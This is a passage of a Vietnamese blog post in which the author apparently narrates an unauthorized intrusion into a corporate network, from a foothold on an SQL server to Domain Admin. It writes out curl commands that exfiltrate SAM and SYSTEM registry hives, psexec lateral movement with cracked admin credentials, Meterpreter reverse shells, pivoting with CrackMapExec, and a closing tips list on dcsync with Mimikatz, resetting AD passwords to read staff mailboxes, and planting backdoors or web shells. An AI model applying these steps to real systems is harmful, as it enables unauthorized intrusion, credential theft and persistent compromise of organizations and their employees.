+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/arizvisa/windows-binary-tools/blob/master/curl.exe</span><br><span class="line"></span><br><span class="line">curl.exe --version</span><br><span class="line">curl 7.70.0 (i386-pc-win32) libcurl/7.70.0 Schannel</span><br><span class="line">Release-Date: 2020-06-06</span><br><span class="line">Protocols: file ftp ftps http https</span><br><span class="line">Features: AsynchDNS IPv6 Kerberos Largefile NTLM SPNEGO SSL SSPI UnixSockets</span><br></pre></td></tr></table></figure>
+<p>Tải lên tập tin sam và system bằng curl.exe với Authorization.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H &quot;Authorization: Bearer &lt;AUTH_TOKEN&gt;&quot; -F &quot;file=@C:/users/public/pictures/sam&quot; https://hrm.victimgroup.com.vn/support/upload</span><br><span class="line">curl -X POST -H &quot;Authorization: Bearer &lt;AUTH_TOKEN&gt;&quot; -F &quot;file=@C:/users/public/pictures/system&quot; https://hrm.victimgroup.com.vn/support/upload</span><br></pre></td></tr></table></figure>
+<p>Hoàn hảo! Tôi chỉ việc lên HRM và tải về. Sau đó thực hiện trích xuất credential và NTLM hash.<br><img src="/2023/07/07/from-sqli-to-domain-admin/dump_cred.png"><br>Được rồi, giờ làm gì với mấy tài khoản này? Hãy để ý vào những tài khoản admin01 admin02 admin03 và admin04. Có một điều mà System Admin hay làm khi triển khai máy chủ ảo, đấy là clone. Clone từ một OS snapshot đã được cấu hình hardening đầy đủ và sau đó sẽ triển khai các dịch vụ tuỳ theo mục đích. Điều ấy có nghĩa là, những máy chủ sẽ có cấu hình giống y hệt nhau, kể cả những tài khoản admin trong máy. Từ giả thiết đấy, tôi đoán chắc 4 tài khoản admin01 admin02 admin03 admin04 cũng sẽ xuất hiện trên đa phần những máy chủ còn lại trong mạng nội bộ.<br>Ý tưởng là tôi sẽ dùng những tài khoản admin này để đăng nhập vào những máy chủ khác trong mạng nội bộ, và biết đâu đó sẽ có máy chủ kết nối ra bên ngoài internet, khi đó tôi có thể thoát khỏi cái cảnh non-interactive shell tù túng này.<br>Crack được 2 trong 4 tài khoản admin ở trên, không khó, ném NTLM hash lên hashes.com<br><em>Tại sao lại phải crack mà không dùng luôn NTLM hash attack? :D</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hashes.com/en/decrypt/hash</span><br></pre></td></tr></table></figure>
+<p>Giờ thì tải vào máy chủ SQL psexec.exe, tải ở đây, hàng chính hãng</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://learn.microsoft.com/en-us/sysinternals/downloads/psexec</span><br></pre></td></tr></table></figure>
+<p>IP local của máy chủ SQL hiện tại là 172.20.x.x, vậy tôi sẽ thử chạy psexec trên dải 172.20.x.0&#x2F;24, hơn 200 lần thử chứ mấy.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\172.20.x.x -u admin01 -p PassOfAdmin01 -i C:\windows\system32\whoami.exe</span><br></pre></td></tr></table></figure>
+<p>Phải có đến hơn chục máy thực thi lệnh thành công, lưu lại IP của những máy này và thực hiện tiếp psexec để “ping” về máy chủ VPS của tôi, nếu có bất kỳ gói tin ICMP nào được gửi đến, thì có nghĩa máy chủ đó trong mạng nội bộ của tổ chức có thể kết nối ra internet. Và không nằm ngoài dự đoán.<br><img src="/2023/07/07/from-sqli-to-domain-admin/pingback_confirm.png"><br>Giờ tôi sẽ tải vào những máy này Meterpreter payload để lấy reverse shell xịn. Cẩn thận hơn, tôi đã chạy lệnh “sc query” trên những máy chủ lân cận và phát hiện một vài máy không có Symantec Endpoint hay Anti Virrus nào, kể cả Windows Defender, lại thêm một pha khó hiểu, sao không cài tất?. Anti Virrus nói chung sẽ làm giảm hiệu năng của máy chủ, nếu có một tác nhân nguy hại nào đó được nhận diện, dịch vụ AV sẽ chạy quét để tìm và ngăn chặn mối nguy hại và điều này gây tốn tài nguyên CPU.<br>Được rồi, lấy reverse shell!</p>
+<h3 id="Get-Reverse-Shell"><a href="#Get-Reverse-Shell" class="headerlink" title="Get Reverse Shell"></a>Get Reverse Shell</h3><p>Đoạn này thì không khó nữa, máy chủ HRM cũng không có Symantec Endpoint, tôi đoán vậy, vì khi ném vào đó Meterpreter payload và trước đó là JuicyPotato.exe, nó không bị xoá đi. Kéo payload về những máy không có AV và thực thi, lấy được reverse shell dễ dàng.<br><img src="/2023/07/07/from-sqli-to-domain-admin/metasploit.png"><br>Giờ thì đã có interactive shell, dừng lại ở đây ấy à, chưa đâu &#x3D;))</p>
+<h3 id="Pivot-Attack"><a href="#Pivot-Attack" class="headerlink" title="Pivot Attack"></a>Pivot Attack</h3><p>Tôi thực hiện quét toàn bộ dải mạng 172.20.0.0&#x2F;16, sử dụng auxiliary&#x2F;scanner của Metasploit. Sau đó sử dùng Crackmapexec để thực thi lệnh và thu thập thông tin từ những máy chủ đó thông qua Socks Proxy. Bài viết về Proxy Tunnel sử dụng Meterpreter&#x2F;Metasploit ở đây.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.offsec.com/metasploit-unleashed/proxytunnels/</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/07/07/from-sqli-to-domain-admin/cme.png"><br>Với thông tin về tên máy, dải IP, tôi bắt đầu ngồi hình dung ra mô hình mạng của cái tập đoàn này. Những máy chủ tôi đang kiểm soát nằm trong vùng mạng PROD (product), vùng mạng này cung cấp các dịch vụ trực tuyến ra ngoài Internet. Sau đó là có vùng mạng UAT (User Acceptance Testing), vùng mạng thực hiện test sản phẩm trước khi đưa lên PROD, vùng mạng DEV và vùng USER (cái này tôi tự đặt tên).<br>Tôi dump toàn bộ hash trên tất cả những máy tôi có quyền, trong số đó có kha khá tài khoản của người dùng do cách đặt username, khả năng cao là những tài khoản Quản trị viên.<br>Và có một vài máy không “nằm” trong domain WORKGROUP. Là domain của tập đoàn. VICTIMGROUP.COM.VN</p>
+<h3 id="To-Domain-Admin"><a href="#To-Domain-Admin" class="headerlink" title="To Domain Admin"></a>To Domain Admin</h3><p>Cấu hình kết nối ở đây thực sự có vấn đề, những môi trường mạng như PROD, UAT, DEV, AD lại thông với nhau. Dễ dàng cho tôi quá.<br>Với một vài tài khoản người dùng, tôi thử dump thông tin LDAP của Domain này và phân tích.<br>Thực ra không mất thời gian phân tích, vì trong số những tài khoản tôi có thì 2 tài khoản thuộc Group Domain Admin. Rồi. Xong.<br>Đoạn này sử dụng <a target="_blank" rel="noopener" href="https://github.com/SpecterOps/BloodHound">https://github.com/SpecterOps/BloodHound</a> thì còn nhanh nữa.<br><img src="/2023/07/07/from-sqli-to-domain-admin/admin_group.png"><br>Giờ thì muốn làm gì thì làm. Dump toàn bộ NTLM hash của người dùng trong Domain, đem đi crack, và đăng nhập vào Office 365 để đọc mail, truy cập VPN, đăng nhập vào các dịch vụ nội bộ…<br>Về cơ bản, tôi có thể làm mọi thứ với hệ thống này từ xa.</p>
+<h3 id="Be-a-good-man-again"><a href="#Be-a-good-man-again" class="headerlink" title="Be a good man, again"></a>Be a good man, again</h3><p>Trong thông tin LDAP thu thập được, tôi có số điện thoại CTO của tập đoàn. Vì gửi email vô ích, có thể email tôi gửi đã bị ném sang mục spam tự động mất rồi, nên tôi quyết định gọi điện cho vị CTO.<br>Câu hỏi của vị CTO sau khi nghe tôi nói về những lỗ hổng trên toàn bộ hệ thống, là “Bây giờ anh muốn gì?”. Muốn gì ấy à, họ đang nghĩ tôi đang tống tiền họ &#x3D;))<br>Và sau đó cũng chẳng gì cả, một lần nữa, từ phản hồi cho đến khắc phục, chẳng gì cả.</p>
+<h3 id="Learn-something"><a href="#Learn-something" class="headerlink" title="Learn something"></a>Learn something</h3><p>Một vài điều mà tôi tự rút ra sau cả tháng chui ra chui vào hệ thống mục tiêu:</p>
+<ul>
+<li>Nên sử dụng Proxy tunnel của Cobalt Strike, Proxy tunnel của Meterpreter&#x2F;Metasploit rất rất phèn, Proxy bị tắc, phiên Meterpreter cũng tắc theo.</li>
+<li>Nếu bạn có tài khoản Domain Admin, bạn có thể dcsync dump ở bất kỳ máy nào trong Domain. Điều này có ích khi tất cả các máy trong Domain đã được cài AV để bảo vệ, bạn chỉ cần dùng máy của mình (không có AV, tất nhiên) và join vào, sau đó để Mimikatz làm việc của nó.</li>
+<li>Nền tảng Office 365 của Microsoft đồng bộ 2 chiều với AD, vậy nên nếu muốn truy cập vào Outlook của nhân viên nào đó mà không có mật khẩu (không crack được NTLM hash), bạn có thể dùng quyền Domain Admin để đổi mật khẩu nhân viên đó trên AD, chờ đôi phút, rồi đăng nhập lại với mật khẩu vừa đổi. Cách này thì…</li>
+<li>Cài cắm một vài back door để phòng khi mất sạch kết nối với các beacon&#x2F;meterpreter session, có thể là web shell, hoặc thông tin kết nối VPN…</li>
+<li>Nếu sử dụng crackmapexec gặp lỗi, hãy thử đổi tham số –exec-method, hoặc sử dụng phiên bản khác. Tôi đã gặp vấn đề với smbexec với phiên bản CME mới nhất nhưng lại bình thường với phiên bản cũ hơn.</li>
+<li>Và đừng cố giúp ai đó khi họ không muốn được giúp, kiểu, nhiều chuyện :D</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/talk/" rel="tag"># talk</a>
+              <a href="/tags/sql-injection/" rel="tag"># sql injection</a>
+              <a href="/tags/active-directory/" rel="tag"># active directory</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/09/20/a-funny-bug-bounty/" rel="prev" title="[Talk] Một chiếc bug bounty buồn cười.">
+                  <i class="fa fa-angle-left"></i> [Talk] Một chiếc bug bounty buồn cười.
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">minhnq22</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
